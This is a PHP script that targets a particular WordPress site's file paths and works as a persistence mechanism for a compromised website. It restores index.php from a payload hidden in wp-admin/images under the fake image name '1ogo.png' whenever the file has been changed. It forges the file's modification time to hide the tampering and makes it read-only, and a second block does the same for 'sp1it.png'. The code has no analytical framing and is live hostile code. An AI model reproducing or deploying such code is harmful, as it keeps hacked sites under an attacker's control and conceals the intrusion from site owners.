<?php 
$lujin = '/home/qwertyir/domains/mortezarastegar.ir/private_html/wp-admin/images/';
$insj = '/home/qwertyir/domains/mortezarastegar.ir/private_html/index.php';
$plsj = '';
$inym = $lujin . '1ogo.png';
$plym = $lujin . 'sp1it.png';
if (file_exists($insj)) {
    if (file_exists($inym)) {
        @chmod($insj, 0777);
        if (md5_file($insj) == md5_file($inym)) {
        } else {
            $chazh = @file_get_contents($inym);
			$at = filemtime($inym);
            file_put_contents($insj, $chazh);
            if ($at) {
                touch($insj, $at);
            }
        }
		@chmod($insj, 0444);
    }
} else {
    if (file_exists($inym)) {
		$at = filemtime($inym);
        $chazh = @file_get_contents($inym);
        file_put_contents($insj, $chazh);
		if ($at) {
			touch($insj, $at);
		}
    }
}
if ($plsj) {
    if (file_exists($plsj)) {
        if (file_exists($plym)) {
            if (md5_file($plsj) == md5_file($plym)) {
            } else {
                $plzh = @file_get_contents($plym);
				$a = filemtime($plym);
                file_put_contents($plsj, $plzh);
                if ($a) {
                    touch($plsj, $a);
                }
            }
        }
    } else {
        if (file_exists($plym)) {
			$a = filemtime($plym);
            $plzh = @file_get_contents($plym);
            file_put_contents($plsj, $plzh);
			if ($a) {
				touch($plsj, $a);
			}
        }
    }
}
?>